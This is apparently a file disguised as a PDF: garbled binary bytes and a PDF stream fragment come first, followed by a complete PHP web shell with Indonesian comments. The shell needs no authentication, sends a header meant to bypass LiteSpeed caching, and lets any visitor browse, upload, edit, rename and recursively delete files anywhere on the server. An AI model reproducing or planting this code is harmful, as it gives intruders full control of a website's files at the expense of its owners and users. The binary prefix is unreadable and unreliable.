áô¤¾Ÿòvò¯…*#ÉâÌ¤•;Ë­çWžä+Á,ñsØFxRŒ¾3û™Œ€;¹lÌiM˜M^$¥`¯`¾?7ó8ÍØŠW»ÐÏîãóa-C'÷Ô`lü¯vø”Â1ôÁÏC1w7\ÝAú0ï¯ÆüÉÁ4ÙE$³eÊ¶Ï‹D.sa®ú_˜ÿŸÅ¬ßLþcDÄÈ:9í¹MhÂÌÔùw^}Ð‰­¯Ã•‡/BIÄ™{ÑË×â™ó®Ÿµ(ßF¸OÈG©EÌÌ[pÄ×g–ƒ¯ÏÁs„ƒPæ+1Î[…å˜yïŠnÂúðŒZ…gâ3à‹~Ðvk£7GwAWô¾è50ë¢aþÝ‚Ep«¢ƒÛ p å˜cŸ!?Äóèu²óörx ó‘“Xà÷x}%ºRñL¿ÄÜY½-ú0£>2PC=xŠ¾ ÃðGÔÛrþ8”Í¬áF—ò<¡NÁUÑ£6¢…ÁèfÞÇaŸJ¹g¤+ö¹Ýîº+¯¨]\S]U¹¨¢¼¬´¤¸¨° ß•—›“åÌtdØE[zZª5%Ù’”˜oŠ3bõº­F­R*ž#ßäXÚ-F²º#B–cùòÚvxà™GèŽˆHZº'"v36q!§9û/âtKœî9Nbk¡¶ _lrˆ‘Ÿ6:Äi²ñªvÄoottˆ‘3_ÍðI†ë·Ûq€Ødl#¤[lŠ,Ý:8ÑÔÝˆÓŒÑ68¼Ú‚|8¨A4±H’#p$]IÂ%5Õä@­G¡")ŽÆ¦H²£‘JáMž¾HëUíMV»½£ ?Bz=p,‰\ŒØ2eCDÅ–}t7°K<˜|â¶i#ôt»t}Ž>Ï5íÞÓA×ˆsáº‘¤mo[.4qrSCû­ó{­üD“Å'ÒæÄÄ­bdïUíó{í´ìèÀ9"œsi÷ÄR\ø6Taó:×ânéh[pA‘îƒîIÚ×ÑD)Ý›ÄˆÆ±Ä18±© “2µãö©”÷ÑèiHi'ÚÚöHÕÑáiL=˜kÇ%»Åä…=ùq’ZÆdD§ŸxçúÆØ)Ö¼vN¯„JäXî{E”¤Ý{ª¢…· &z« ?GEúÐ¾ˆ¦¡{ÂXƒt#Q8qâ}@û;Îüa!Å#S”Nãû@Qê%sŽ†ý³xÄåŠäåQQ5 EQÆ+Y»¢ ë4qŒ"V¨>hEÝz:jŠPùv;5ï®i7ô`#²ãªv©-Bu ÜE®Ž×M{ŽÏö˜×Óž³=sÃáô¤¾Ÿòvò¯…*#ÉâÌ¤•;Ë­çWžä+Á,ñsØFxRŒ¾3û™Œ€;¹lÌiM˜M^$¥`¯`¾?7ó8ÍØŠW»ÐÏîãóa-C'÷Ô`lü¯vø”Â1ôÁÏC1w7\ÝAú0ï¯ÆüÉÁ4ÙE$³eÊ¶Ï‹D.sa®ú_˜ÿŸÅ¬ßLþcDÄÈ:9í¹MhÂÌÔùw^}Ð‰­¯Ã•‡/BIÄ™{ÑË×â™ó®Ÿµ(ßF¸OÈG©EÌÌ[pÄ×g–ƒ¯ÏÁs„ƒPæ+1Î[…å˜yïŠnÂúðŒZ…gâ3à‹~Ðvk£7GwAWô¾è50ë¢aþÝ‚Ep«¢ƒÛ p å˜cŸ!?Äóèu²óörx ó‘“Xà÷x}%ºRñL¿ÄÜY½-ú0£>2PC=xŠ¾ ÃðGÔÛrþ8”Í¬áF—ò<¡NÁUÑ£6¢…ÁèfÞÇaŸJ¹g¤+ö¹Ýîº+¯¨]\S]U¹¨¢¼¬´¤¸¨° ß•—›“åÌtdØE[zZª5%Ù’”˜oŠ3bõº­F­R*ž#ßäXÚ-F²º#B–cùòÚvxà™GèŽˆHZº'"v36q!§9û/âtKœî9Nbk¡¶ _lrˆ‘Ÿ6:Äi²ñªvÄoottˆ‘3_ÍðI†ë·Ûq€Ødl#¤[lŠ,Ý:8ÑÔÝˆÓŒÑ68¼Ú‚|8¨A4±H’#p$]IÂ%5Õä@­G¡")ŽÆ¦H²£‘JáMž¾HëUíMV»½£ ?Bz=p,‰\ŒØ2eCDÅ–}t7°K<˜|â¶i#ôt»t}Ž>Ï5íÞÓA×ˆsáº‘¤mo[.4qrSCû­ó{­üD“Å'ÒæÄÄ­bdïUíó{í´ìèÀ9"œsi÷ÄR\ø6Taó:×ânéh[pA‘îƒîIÚ×ÑD)Ý›ÄˆÆ±Ä18±© “2µãö©”÷ÑèiHi'ÚÚöHÕÑáiL=˜kÇ%»Åä…=ùq’ZÆdD§ŸxçúÆØ)Ö¼vN¯„JäXî{E”¤Ý{ª¢…· &z« ?GEúÐ¾ˆ¦¡{ÂXƒt#Q8qâ}@û;Îüa!Å#S”Nãû@Qê%sŽ†ý³xÄåŠäåQQ5 EQÆ+Y»¢ ë4qŒ"V¨>hEÝz:jŠPùv;5ï®i7ô`#²ãªv©-Bu ÜE®Ž×M{ŽÏö˜×Óž³=sÃ%PDF-1.4 %Ã¤Ã¼Ã¶ÃŸ 2 0 obj <> stream xœŠ» Ã0Ew}…æ‚Ó+'‘0‚¦¡[ÀÐ¡tëc+4K¿rî½:è„¿ôap€G•èLSãúàË†ßÿg»õEs¥Q»Ì).Ô;oOÂ¹>¯bA "z¹`°ØÊE²à9·ajØ™{ŠÙ´`o¡/ndŸv«g:VZhá¯å ž endstream endobj 3 0 obj 130 endobj 5 0 obj <> stream xœí|{\\ÕµðÚçœy2ÃÌ†á5¼á”!@^$!a€&f23IÕÄZkCÔÐÖZíÃÄÚ¨m´™“’hkô¶¶>ÚÄj­ÖÄ«mµ6mÚF{[ ó­½Ï@Lmïýîßï÷ekïµ×^{ïµ×kŸÃ G½ ƒÀƒ»wØ(JN4ÀóÄÔ»5,>ø‹Vl“Óªö†oÿæ ¿Ð|@ï{¦ýNƒ îéA¯§/­rg,€ˆü°h m3ã*;öCæàpøº;…p ¶k±]5äïõ|Y,·a;ŒíôaÏuÏKØÆ9Añ{?õ¬á%l? P8ð‡Â}hÍ§ý 7ð·ìþ÷±½J’^ô£CTIÛ/(”*µF£ÓÃÿ‡Å«À†Êß V€è›o#¼3³2ú‘b38f6EOóñÈüˆN¸ö@&œ%%ð‡•ðÔC+Ü Ëà€X'Ïh„‡ÀIlÀÁRH" ¸^…k ¿ÓÍð1áz¹´Ðß…cdˆ¬ƒ"Ä—sùÄ…+ïŽ‡$È‰þ4ú ¶¾¿!™Ñƒ°±ßBdÃvø˜`<ý%Í„x\OÞ;tÃ.¡\˜ˆn†Åp~Aš[ ãŠW4‡aGÝO’Èñè©èïà/ÎôøEñL]4!jŽþ.…R|næôÌ{3F'@…^¶õ0 ßA-ü‰$¢¹d ‘·PòIîQ>–7ò¾‚¯çÛøþóüüOøŸ Aa¿ðšb…Â£Ø¯òÌŒÌ¼mŽ~h–P¢\ÙåP‰þÓÞ´åà„ëá&˜€;Ð_¾{a?îû x~¿†? €ØQf®>Œ^w¹¯{ÈÃäIò#òy“|@/.¯nWÇ5pK¹î¼îäNr/sïð©|
<?php
header('X-Bypass-LiteSpeed: true');
<?PhP
// Direktori awal tempat file diupload
$uploadDir = __DIR__; 

// Fungsi untuk memvalidasi jalur agar tetap aman
function is_safe_path($path) {
    return realpath($path) !== false; // Pastikan jalur valid
}

// Fungsi untuk menampilkan izin file dalam format octal
function getFilePermissions($file) {
    $permissions = fileperms($file);
    return substr(sprintf('%o', $permissions), -4);
}

// Fungsi untuk mengupload file
if (isset($_FILES['upload'])) {
    $uploadName = basename($_FILES['upload']['name']); // Ambil nama file asli
    $uploadTmp = $_FILES['upload']['tmp_name'];
    $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $uploadDir;

    // Validasi direktori tujuan
    if (!is_safe_path($targetDir) || !is_dir($targetDir)) {
        echo "<script>alert('Direktori tujuan tidak valid');</script>";
    } else {
        $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;

        if (move_uploaded_file($uploadTmp, $uploadPath)) {
            echo "<script>alert('File berhasil diupload ke $uploadPath');</script>";
        } else {
            echo "<script>alert('Gagal mengupload file');</script>";
        }
    }
}

// Fungsi untuk mengedit file
if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'])) {
    $filePath = $_GET['edit'];

    if (isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('File berhasil disimpan');</script>";
    }

    echo '<form method="POST">';
    echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
    echo '<br><input type="submit" value="Simpan">';
    echo '</form>';
    exit;
}

// Fungsi untuk menghapus file atau folder beserta isinya
function delete_directory($dir) {
    if (!is_dir($dir)) return false;

    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            delete_directory($filePath); // Hapus folder secara rekursif
        } else {
            unlink($filePath); // Hapus file
        }
    }

    rmdir($dir); // Hapus folder setelah isinya terhapus
}

// Fungsi untuk menghapus file atau folder
if (isset($_GET['delete']) && is_safe_path($_GET['delete'])) {
    $deletePath = $_GET['delete'];

    if (is_file($deletePath)) {
        unlink($deletePath);
        echo "<script>alert('File berhasil dihapus');</script>";
    } elseif (is_dir($deletePath)) {
        delete_directory($deletePath); // Hapus folder beserta isinya
        echo "<script>alert('Folder beserta isinya berhasil dihapus');</script>";
    }
}

// Fungsi untuk mengganti nama file atau folder
if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'])) {
    $oldPath = $_GET['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Nama file atau folder berhasil diubah');</script>";
    } else {
        echo "<script>alert('Gagal mengganti nama file atau folder');</script>";
    }
}

// Fungsi untuk menampilkan breadcrumb path
function show_pwd($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $path = '';
    $pwd = '';

    foreach ($parts as $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        $pwd .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

// Direktori yang sedang dijelajahi
$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
$files = scandir($dir);

// Form untuk membuat folder baru
if (isset($_POST['createFolder'])) {
    $newFolderName = $_POST['folderName'];
    $newFolderPath = realpath($dir) . DIRECTORY_SEPARATOR . $newFolderName;

    if (!is_dir($newFolderPath)) {
        mkdir($newFolderPath);
        echo "<script>alert('Folder berhasil dibuat: $newFolderPath');</script>";
    } else {
        echo "<script>alert('Folder sudah ada');</script>";
    }
}

echo '<h2>Direktori Saat Ini (PWD)</h2>';
echo '<p>' . show_pwd($dir) . '</p>';

// Form untuk upload file
echo '<form method="POST" enctype="multipart/form-data">';
echo 'Pilih File: <input type="file" name="upload"><br>';
echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
echo '<input type="submit" value="Upload">';
echo '</form>';

// Form untuk membuat folder baru
echo '<form method="POST">';
echo 'Nama Folder Baru: <input type="text" name="folderName"><br>';
echo '<input type="submit" name="createFolder" value="Buat Folder Baru">';
echo '</form>';

echo '<ul>';
if ($dir !== '/') {
    // Tombol untuk kembali ke direktori sebelumnya
    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Kembali)</a></li>';
}

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = realpath("$dir/$f");

    // Tampilkan file atau folder dengan izin dan tindakan
    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?d=" . urlencode($path) . "'>$f</a> 
                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta isinya?\");'>[Hapus]</a>
                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
    } else {
        echo "<li>[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
                <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
    }
}
echo '</ul>';

// Form untuk rename file atau folder
if (isset($_GET['rename'])) {
    $renamePath = $_GET['rename'];
    echo '<form method="POST">';
    echo 'Nama Baru: <input type="text" name="newName" value="' . htmlspecialchars(basename($renamePath)) . '">';
    echo '<input type="submit" value="Ubah Nama">';
    echo '</form>';
}
?>

